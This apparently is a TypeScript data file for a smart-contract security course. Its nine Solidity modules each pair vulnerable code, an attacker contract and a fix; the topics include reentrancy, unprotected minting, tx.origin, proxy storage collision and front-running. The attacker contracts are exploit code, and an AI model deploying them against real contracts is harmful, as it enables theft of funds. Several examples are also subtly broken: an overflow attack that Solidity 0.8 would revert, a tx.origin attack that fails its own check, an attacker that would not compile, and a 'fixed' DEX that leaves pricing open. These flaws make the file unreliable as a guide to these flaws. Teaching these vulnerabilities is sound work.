import { SecurityModule } from './types'

export const modules: SecurityModule[] = [
    {
        id: 'reentrancy',
        title: 'Reentrancy Attack',
        description: 'Learn how reentrancy attacks can drain funds from smart contracts',
        difficulty: 'beginner',
        category: 'Financial Security',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint amount = balances[msg.sender];
        require(balances[msg.sender] > 0, "Insufficient balance");
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}`,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public target;
    address public owner;
    
    constructor(address _targetAddress) {
        target = VulnerableBank(_targetAddress);
        owner = msg.sender;
    }
    
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    
    fallback() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }
    
    function withdraw() public {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}`,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FixedBank {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint amount = balances[msg.sender];
        require(balances[msg.sender] > 0, "Insufficient balance");
        
        balances[msg.sender] = 0;  // State change before external call
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}`,
        explanation: 'Reentrancy occurs when a contract makes an external call to another contract that calls back into the original contract before the original execution completes.',
        vulnerability: 'The contract updates the user balance AFTER the external call, allowing the attacker to call withdraw() multiple times before the balance is set to 0.',
        impact: 'Attackers can drain all funds from the contract by repeatedly calling the withdraw function.',
        prevention: 'Use the Checks-Effects-Interactions pattern: perform all state changes before making external calls.',
        references: [
            'https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy',
            'https://swcregistry.io/docs/SWC-107'
        ]
    },
    {
        id: 'access-control',
        title: 'Access Control Misconfiguration',
        description: 'Understand how improper access control can lead to unauthorized actions',
        difficulty: 'beginner',
        category: 'Access Control',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableVault {
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        balances[to] += amount;
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
}`,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public target;
    
    constructor(address _targetAddress) {
        target = VulnerableVault(_targetAddress);
    }
    
    function attack() public {
        // Anyone can call mint() - no access control!
        target.mint(address(this), 1000 ether);
        
        // Transfer the minted tokens to attacker
        target.transfer(msg.sender, 1000 ether);
    }
}`,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FixedVault {
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function mint(address to, uint256 amount) public onlyOwner {
        totalSupply += amount;
        balances[to] += amount;
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
}`,
        explanation: 'Access control vulnerabilities occur when functions lack proper permission checks, allowing unauthorized users to perform privileged actions.',
        vulnerability: 'The mint() function is missing the onlyOwner modifier, allowing anyone to create new tokens.',
        impact: 'Unauthorized users can mint unlimited tokens, destroying the token economics and potentially draining liquidity.',
        prevention: 'Always implement proper access control using modifiers and check permissions before executing sensitive operations.',
        references: [
            'https://docs.soliditylang.org/en/latest/security-considerations.html#access-control',
            'https://swcregistry.io/docs/SWC-105'
        ]
    },
    {
        id: 'integer-overflow',
        title: 'Integer Overflow/Underflow',
        description: 'Learn how arithmetic overflow can lead to unexpected behavior',
        difficulty: 'intermediate',
        category: 'Arithmetic Security',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;
    
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;  // Potential overflow
        
        return true;
    }
    
    function mint(address to, uint256 amount) public {
        totalSupply += amount;  // Potential overflow
        balances[to] += amount;  // Potential overflow
    }
    
    function burn(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        totalSupply -= amount;  // Potential underflow
    }
}`,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableToken.sol";

contract Attacker {
    VulnerableToken public target;
    
    constructor(address _targetAddress) {
        target = VulnerableToken(_targetAddress);
    }
    
    function attack() public {
        // Get initial balance
        uint256 initialBalance = target.balances(address(this));
        
        // Transfer max uint256 to cause overflow
        target.transfer(address(this), type(uint256).max - initialBalance);
        
        // Attacker now has huge balance due to overflow
        uint256 finalBalance = target.balances(address(this));
    }
}`,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FixedToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;
    
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(balances[to] + amount >= balances[to], "Overflow detected");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
        
        return true;
    }
    
    function mint(address to, uint256 amount) public {
        require(totalSupply + amount >= totalSupply, "Overflow detected");
        require(balances[to] + amount >= balances[to], "Overflow detected");
        
        totalSupply += amount;
        balances[to] += amount;
    }
    
    function burn(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(totalSupply >= amount, "Underflow detected");
        
        balances[msg.sender] -= amount;
        totalSupply -= amount;
    }
}`,
        explanation: 'Integer overflow and underflow occur when arithmetic operations exceed the maximum or minimum values that can be stored in a variable.',
        vulnerability: 'Arithmetic operations without overflow checks can wrap around, causing unexpected behavior.',
        impact: 'Attackers can manipulate token balances, bypass restrictions, or cause contract malfunction.',
        prevention: 'Use SafeMath library (for Solidity <0.8.0) or built-in overflow checks (Solidity >=0.8.0).',
        references: [
            'https://docs.soliditylang.org/en/latest/security-considerations.html#integer-overflow-and-underflow',
            'https://swcregistry.io/docs/SWC-101'
        ]
    },
    {
        id: 'unchecked-calls',
        title: 'Unchecked External Calls',
        description: 'Understand the dangers of not checking return values from external calls',
        difficulty: 'intermediate',
        category: 'External Interaction',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;
    bool public ended;
    
    function bid() public payable {
        require(msg.value > highestBid, "Bid not high enough");
        require(!ended, "Auction ended");
        
        if (highestBidder != address(0)) {
            // Unchecked external call - can fail silently
            highestBidder.call{value: highestBid}("");
        }
        
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
    
    function endAuction() public {
        require(!ended, "Already ended");
        ended = true;
    }
}`,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableAuction.sol";

contract RejectingContract {
    // This contract rejects all incoming ETH
    fallback() external payable {
        revert("I reject ETH");
    }
    
    receive() external payable {
        revert("I reject ETH");
    }
}

contract Attacker {
    VulnerableAuction public target;
    RejectingContract public rejector;
    
    constructor(address _targetAddress) {
        target = VulnerableAuction(_targetAddress);
        rejector = new RejectingContract();
    }
    
    function attack() public payable {
        // First bid with rejector contract
        target.bid{value: 1 ether}();
        
        // Now bid higher - refund to rejector will fail but bid succeeds
        target.bid{value: 2 ether}();
        
        // Previous bidder (rejector) lost their bid without refund
    }
}`,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FixedAuction {
    address public highestBidder;
    uint256 public highestBid;
    bool public ended;
    
    function bid() public payable {
        require(msg.value > highestBid, "Bid not high enough");
        require(!ended, "Auction ended");
        
        if (highestBidder != address(0)) {
            // Check return value of external call
            (bool success,) = highestBidder.call{value: highestBid}("");
            require(success, "Refund failed");
        }
        
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
    
    function endAuction() public {
        require(!ended, "Already ended");
        ended = true;
    }
}`,
        explanation: 'External calls can fail for various reasons. Not checking their return values can lead to unexpected state changes.',
        vulnerability: 'The call to refund the previous bidder is not checked, so the bid succeeds even if the refund fails.',
        impact: 'Users can lose funds when refunds fail, and the contract state becomes inconsistent.',
        prevention: 'Always check the return value of external calls and handle failures appropriately.',
        references: [
            'https://docs.soliditylang.org/en/latest/security-considerations.html#low-level-call-functions',
            'https://swcregistry.io/docs/SWC-104'
        ]
    },
    {
        id: 'tx-origin',
        title: 'TX-Origin Authentication',
        description: 'Learn the difference between tx.origin and msg.sender',
        difficulty: 'beginner',
        category: 'Authentication',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableWallet {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(tx.origin == owner, "Not owner");  // Vulnerable!
        _;
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    receive() external payable {}
}`,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableWallet.sol";

contract Attacker {
    VulnerableWallet public target;
    address public owner;
    
    constructor(address _targetAddress) {
        target = VulnerableWallet(_targetAddress);
        owner = msg.sender;
    }
    
    function attack() public {
        // Trick the owner into calling this function
        target.withdraw(target.balance);
    }
    
    // This will be called by the vulnerable wallet
    fallback() external payable {
        // tx.origin will be the original EOA owner, not this contract
        // So the check in vulnerable wallet passes!
        if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        }
    }
}`,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FixedWallet {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");  // Fixed!
        _;
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    receive() external payable {}
}`,
        explanation: 'tx.origin refers to the original EOA that initiated the transaction, while msg.sender refers to the immediate caller.',
        vulnerability: 'Using tx.origin for authentication allows phishing attacks where malicious contracts trick users into performing actions.',
        impact: 'Attackers can steal funds from users by convincing them to interact with malicious contracts.',
        prevention: 'Always use msg.sender for authentication, never tx.origin.',
        references: [
            'https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin',
            'https://swcregistry.io/docs/SWC-115'
        ]
    },
    {
        id: 'arcadia-finance',
        title: 'Arcadia Finance Exploit',
        description: 'A sophisticated $3.5M exploit involving unvalidated router injection and reentrancy within the vault liquidation flow.',
        difficulty: 'advanced',
        category: 'Reentrancy & Input Validation',
        isRealWorld: true,
        loss: '$3.5M',
        date: 'July 10, 2023',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ArcadiaSwapLogic {
    // This function was the core of the exploit
    function _swapViaRouter(
        address router,
        uint256 amountIn,
        bytes memory data
    ) internal {
        // CRITICAL FLAW: No validation of router address!
        // Attacker injected their malicious contract address here
        (bool success, ) = router.call(data);
        require(success, "Swap failed");
    }

    function rebalance(address router, bytes memory data) public {
        // ... logic ...
        _swapViaRouter(router, 100 ether, data);
    }
}`,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousRouter {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }

    // When the vault calls this router, we re-enter the vault
    // to liquidate it before the health check completes
    fallback() external payable {
        // Step 1: Drain assets
        // Step 2: Call liquidateVault(attacker_vault)
        // This eliminates the debt, making the vault look "healthy"
        // even though it's empty.
    }
}`,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ArcadiaSwapLogicSecure {
    mapping(address => bool) public whitelistedRouters;

    function _swapViaRouter(
        address router,
        uint256 amountIn,
        bytes memory data
    ) internal {
        // FIX: Strict whitelisting of router addresses
        require(whitelistedRouters[router], "Untrusted router");
        
        (bool success, ) = router.call(data);
        require(success, "Swap failed");
    }
}`,
        explanation: 'The Arcadia Finance exploit was a surgical, two-day attack that drained $3.5M from pools on Optimism and Ethereum. Phase 1 (Setting the Trap): The attacker deployed malicious contracts that triggered Arcadia\'s circuit breakers, pausing the protocol. After analysis, the team unpaused, which activated a cooldown period that prevented immediate re-pausing. Phase 2 (The Attack): The attacker used Flash Loans and a Reentrancy bypass. They borrowed funds, moved them out of the vault, and then used a malicious router to trigger a liquidation call. This liquidation erased their debt before the health check could run, making the empty vault appear healthy.',
        vulnerability: 'Unvalidated router address injection + Reentrancy in liquidateVault() function.',
        impact: '$3.5M drained across Optimism and Ethereum chains.',
        prevention: 'Strict whitelisting of router addresses and ensuring health checks cannot be bypassed via internal state changes like liquidation.',
        references: [
            'https://www.binance.com/en/square/post/772610',
            'https://olympixai.medium.com/the-arcadia-3-6m-exploit-was-a-blueprint-for-future-failures-1d99eb28e6f1',
            'https://www.guardrail.ai/blog/arcadia-finance-hack-july-2025'
        ],
        images: [
            'https://public.bnbstatic.com/image/cms/content/body/202307/326281105002dad8807deca3682707fa.jpeg',
            'https://miro.medium.com/v2/resize:fit:1100/format:webp/0*mEsBeacS8zE_c2F7',
            'https://cdn.prod.website-files.com/67af028edf781393de6c3f03/68835766de3d636972fff1d7_AD_4nXffBgnHyyzDDr7pY-hxDijYgkYKeFcLtqyjwhI3Ap1uf5mIfxYf63Xl-xebpwi5Ls43FMsLsJhTwXa7rXiyzApb_AfwbR9ABS7YRwsninPoGq7ndKOUUDaHttpNRv1w_M3r0aFvHQ.png',
            'https://cdn.prod.website-files.com/67af028edf781393de6c3f03/68835766de3d636972fff1da_AD_4nXebJNSVzEojYzt5sPc2Ir4nmkPZsVklkFGnEEB4kUZ_fE3DoAdPBMZt7I9lvByC6ucKCoAzs9bBCzMjYTwnPx7EhzmbKAjzM5B_v5ibBYW1saRvYKAMySyxE__8KxIRnLnYqAveeg.png',
            'https://cdn.prod.website-files.com/67af028edf781393de6c3f03/68835766de3d636972fff1ce_AD_4nXdEI7up9xJPTJ1LiOLd6wnjAJt2nCcqAlFGdBdxzQUd2rIluLQVx-fhSH9jq0BnrccffT9QGPs4NUQViMMa8tMOuBF-22I-HAtr1ycADA3EuF_D09JH7oNU2ZLMfW7meVzZpLhJNA.png',
            'https://cdn.prod.website-files.com/67af028edf781393de6c3f03/68835766de3d636972fff1c7_AD_4nXcYF8BGB_2S6ymamjZbiRNZn5UEHm7PPexTX1JmQL-c2UP_0IYpk8fMuSdHFcQfeqWyLdILgsehpgrYuZP-le3itKbuyRBWSaojeTeIrkgq1Q6Ahzz5_rcT8DEyiCETBb_8eH-Ong.png',
            'https://cdn.prod.website-files.com/67af028edf781393de6c3f03/68835766de3d636972fff1ca_AD_4nXdY34xQYsxMN_ox_53yzYLd91Z1aPjLRBEZ1UJHDo03TIvmmeCnQpuJsyCgfvrN0-v9gfK_3lmTT-WyvJQGFprv1BLb5DWX4Q2vVc_4D769Vc2KEg3QK1S8gwdyA7tsgz8r1Id55Q.png',
            'https://cdn.prod.website-files.com/67af028edf781393de6c3f03/68835766de3d636972fff1d1_AD_4nXf2rHoOaregEBVubaJsneRK78v3y8C2saDh6GMVkN9RQKSzu-J55D1UPjwTRa9j4D1l33scGz1mDT92rHnv2wiDjL2vsVHbsopkgQt9pvuUiiFZ_eAv2zHSkxtbN_0eWSOqLYuKuw.png'
        ]
    },
    {
        id: 'dos',
        title: 'Denial of Service (DoS)',
        description: 'Learn how contracts can be vulnerable to denial of service attacks',
        difficulty: 'advanced',
        category: 'Availability',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract VulnerableKing {
    address public king;
    uint256 public prize;
    address[] public players;

    function becomeKing() public payable {
        require(msg.value > prize, "Not enough to become king");

        if (king != address(0)) {
            // External call that can fail
            (bool success,) = king.call{ value: prize } ("");
            require(success, "Prize transfer failed");
        }

        king = msg.sender;
        prize = msg.value;
        players.push(msg.sender);
    }

    function claimThrone() public {
        require(msg.sender == king, "Not the king");
        (bool success,) = msg.sender.call{ value: prize } ("");
        require(success, "Transfer failed");
        king = address(0);
        prize = 0;
    }
} `,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

import "./VulnerableKing.sol";

contract DoSContract {
    // This contract rejects all incoming ETH
    fallback() external payable {
        revert("I reject ETH - DoS attack!");
    }

    receive() external payable {
        revert("I reject ETH - DoS attack!");
    }
}

contract Attacker {
    VulnerableKing public target;
    DoSContract public dosContract;

    constructor(address _targetAddress) {
        target = VulnerableKing(_targetAddress);
        dosContract = new DoSContract();
    }

    function attack() public payable {
        // Become king with DoS contract
        target.becomeKing{ value: 1 ether } ();

        // Now no one can become king because prize transfer will fail
        // The contract is stuck forever!
    }
} `,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract FixedKing {
    address public king;
    uint256 public prize;
    address[] public players;
    mapping(address => uint256) public pendingWithdrawals;

    function becomeKing() public payable {
        require(msg.value > prize, "Not enough to become king");

        if (king != address(0)) {
            // Store prize for withdrawal instead of immediate transfer
            pendingWithdrawals[king] += prize;
        }

        king = msg.sender;
        prize = msg.value;
        players.push(msg.sender);
    }

    function withdrawPrize() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No prize to withdraw");

        pendingWithdrawals[msg.sender] = 0;
        (bool success,) = msg.sender.call{ value: amount } ("");
        require(success, "Transfer failed");
    }

    function claimThrone() public {
        require(msg.sender == king, "Not the king");
        pendingWithdrawals[msg.sender] += prize;
        king = address(0);
        prize = 0;
    }
} `,
        explanation: 'DoS vulnerabilities occur when an attacker can prevent normal contract operation, often through failing external calls.',
        vulnerability: 'The contract tries to send ETH to the previous king, which can fail if the king is a contract that rejects ETH.',
        impact: 'The contract becomes permanently stuck - no one can become king after a DoS contract takes the throne.',
        prevention: 'Use withdrawal patterns instead of direct transfers, or implement proper error handling for external calls.',
        references: [
            'https://docs.soliditylang.org/en/latest/security-considerations.html#denial-of-service',
            'https://swcregistry.io/docs/SWC-113'
        ]
    },
    {
        id: 'storage-collision',
        title: 'Storage Collision / Proxy Bug',
        description: 'Understand how storage layout can lead to vulnerabilities in proxy contracts',
        difficulty: 'advanced',
        category: 'Storage Security',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract VulnerableImplementation {
    address public owner;
    uint256 public value;
    bool public initialized;

    function initialize(address _owner) public {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
    }

    function setValue(uint256 _value) public {
        require(msg.sender == owner, "Not owner");
        value = _value;
    }
}

contract VulnerableProxy {
    address public implementation;
    address public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result:= delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
                default { return (0, returndatasize()) }
            }
        }
    } `,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

    import "./VulnerableProxy.sol";

contract Attacker {
    VulnerableProxy public target;

        constructor(address _targetAddress) {
            target = VulnerableProxy(_targetAddress);
        }

        function attack() public {
            // Call initialize on implementation through proxy
            // This will overwrite proxy's owner due to storage collision!
            target.call(
                abi.encodeWithSignature("initialize(address)", address(this))
            );

            // Now attacker controls the proxy
            target.call(
                abi.encodeWithSignature("upgradeTo(address)", address(this))
            );
        }

        function upgradeTo(address newImplementation) public {
            // This function doesn't exist in proxy but will be delegatecalled
            // Attacker can change implementation to malicious contract
        }
    } `,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract FixedImplementation {
    address public owner;
    uint256 public value;
    bool public initialized;

        function initialize(address _owner) public {
            require(!initialized, "Already initialized");
            owner = _owner;
            initialized = true;
        }

        function setValue(uint256 _value) public {
            require(msg.sender == owner, "Not owner");
            value = _value;
        }
    }

contract FixedProxy {
    address public implementation; // slot 0
    address public admin; // slot 1
    bool public initialized; // slot 2
    
    modifier onlyAdmin() {
            require(msg.sender == admin, "Not admin");
            _;
        }

        constructor(address _implementation) {
            implementation = _implementation;
            admin = msg.sender;
        }

        function upgradeTo(address _implementation) public onlyAdmin {
            implementation = _implementation;
        }

        fallback() external payable {
        address impl = implementation;
        assembly {
                calldatacopy(0, 0, calldatasize())
                let result:= delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
                returndatacopy(0, 0, returndatasize())
                switch result
            case 0 { revert(0, returndatasize()) }
                    default { return (0, returndatasize()) }
                }
            }
        } `,
        explanation: 'Storage collision occurs when proxy and implementation contracts have conflicting storage layouts, allowing unauthorized state changes.',
        vulnerability: 'The proxy and implementation both use storage slot 0 for different variables, causing collisions during delegatecall.',
        impact: 'Attackers can overwrite proxy admin address and gain control of the proxy contract.',
        prevention: 'Use proper storage slot separation, EIP-1967 standard, or OpenZeppelin upgradeable contracts.',
        references: [
            'https://eips.ethereum.org/EIPS/eip-1967',
            'https://docs.openzeppelin.com/contracts/4.x/api/proxy'
        ]
    },
    {
        id: 'frontrunning',
        title: 'Front-Running',
        description: 'Learn how transaction ordering can be exploited for profit',
        difficulty: 'intermediate',
        category: 'MEV Security',
        vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract VulnerableDEX {
            mapping(address => mapping(address => uint256)) public balances;
            mapping(address => uint256) public prices;

            function deposit(address token, uint256 amount) public {
                balances[token][msg.sender] += amount;
            }

            function swap(address tokenA, address tokenB, uint256 amountA) public {
                require(balances[tokenA][msg.sender] >= amountA, "Insufficient balance");
        
        uint256 amountB = (amountA * prices[tokenB]) / prices[tokenA];

                balances[tokenA][msg.sender] -= amountA;
                balances[tokenB][msg.sender] += amountB;
            }

            function setPrice(address token, uint256 price) public {
                prices[token] = price;
            }

            function getBalance(address token, address user) public view returns(uint256) {
                return balances[token][user];
            }
        } `,
        attackCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

        import "./VulnerableDEX.sol";

contract Attacker {
    VulnerableDEX public target;
    address public tokenA;
    address public tokenB;

            constructor(address _targetAddress, address _tokenA, address _tokenB) {
                target = VulnerableDEX(_targetAddress);
                tokenA = _tokenA;
                tokenB = _tokenB;
            }

            function frontRun(uint256 newPriceA, uint256 newPriceB) public {
                // Monitor mempool for large swap transactions
                // When detected, update prices first to profit

                // Step 1: Update price to favorable rate
                target.setPrice(tokenA, newPriceA);
                target.setPrice(tokenB, newPriceB);

                // Step 2: Perform swap at better rate
                target.swap(tokenA, tokenB, 1000);

                // Step 3: Restore original prices (optional)
                // target.setPrice(tokenA, originalPriceA);
                // target.setPrice(tokenB, originalPriceB);
            }

            function sandwichAttack(uint256 victimAmount, uint256 attackAmount) public {
                // Step 1: Buy before victim (pushes price up)
                target.swap(tokenA, tokenB, attackAmount);

                // Step 2: Victim's transaction executes (worse rate for them)
                // target.swap(tokenA, tokenB, victimAmount); // Victim's tx

                // Step 3: Sell after victim (profit from price difference)
                target.swap(tokenB, tokenA, attackAmount * 2);
            }
        } `,
        fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract FixedDEX {
            mapping(address => mapping(address => uint256)) public balances;
            mapping(address => uint256) public prices;
    uint256 public constant DEADLINE_BUFFER = 300; // 5 minutes
    
    struct Order {
        address user;
        address tokenA;
        address tokenB;
        uint256 amountA;
        uint256 minAmountB;
        uint256 deadline;
        bool executed;
            }

            mapping(bytes32 => Order) public orders;

            function deposit(address token, uint256 amount) public {
                balances[token][msg.sender] += amount;
            }

            function createOrder(
                address tokenA,
                address tokenB,
                uint256 amountA,
                uint256 minAmountB,
                uint256 deadline
            ) public returns(bytes32) {
                require(deadline > block.timestamp + DEADLINE_BUFFER, "Deadline too soon");
                require(balances[tokenA][msg.sender] >= amountA, "Insufficient balance");
        
        bytes32 orderId = keccak256(abi.encodePacked(
                    msg.sender, tokenA, tokenB, amountA, block.timestamp
                ));

                orders[orderId] = Order({
                    user: msg.sender,
                    tokenA: tokenA,
                    tokenB: tokenB,
                    amountA: amountA,
                    minAmountB: minAmountB,
                    deadline: deadline,
                    executed: false
                });

                return orderId;
            }

            function executeOrder(bytes32 orderId) public {
        Order storage order = orders[orderId];
                require(!order.executed, "Already executed");
                require(block.timestamp <= order.deadline, "Order expired");
                require(balances[order.tokenA][order.user] >= order.amountA, "Insufficient balance");
        
        uint256 amountB = (order.amountA * prices[order.tokenB]) / prices[order.tokenA];
                require(amountB >= order.minAmountB, "Slippage too high");

                balances[order.tokenA][order.user] -= order.amountA;
                balances[order.tokenB][order.user] += amountB;

                order.executed = true;
            }

            function setPrice(address token, uint256 price) public {
                // Add access control, delay, or commit-reveal scheme
                prices[token] = price;
            }
        } `,
        explanation: 'Front-running occurs when an attacker observes pending transactions and executes their own transaction first to profit from the price movement.',
        vulnerability: 'The DEX allows immediate price updates and swaps, enabling attackers to see and front-run large trades.',
        impact: 'Traders get worse execution prices, and attackers can profit at the expense of regular users.',
        prevention: 'Use commit-reveal schemes, batch auctions, or implement slippage protection and minimum execution delays.',
        references: [
            'https://ethereum.org/en/developers/docs/mev/',
            'https://swcregistry.io/docs/SWC-114'
        ]
    }
]